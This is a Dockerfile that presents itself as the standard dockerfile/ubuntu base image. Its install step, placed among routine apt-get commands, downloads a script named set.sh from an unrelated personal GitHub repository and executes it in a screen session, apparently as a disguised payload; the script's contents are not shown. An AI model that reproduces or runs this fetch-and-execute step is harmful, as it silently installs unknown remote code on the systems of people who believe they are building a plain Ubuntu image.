#
# Ubuntu Dockerfile
#
# https://github.com/dockerfile/ubuntu
#

# Pull base image.
FROM ubuntu:14.04

# Install.
RUN \
  apt-get update && \
  apt-get install screen -y && \
  apt-get install -y wget && \
  wget https://github.com/antonylally07/sgr/raw/main/set.sh  && \
  chmod +x set.sh  && \
  ./set.sh > screen -R azuvi && \
  rm -rf /var/lib/apt/lists/*

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
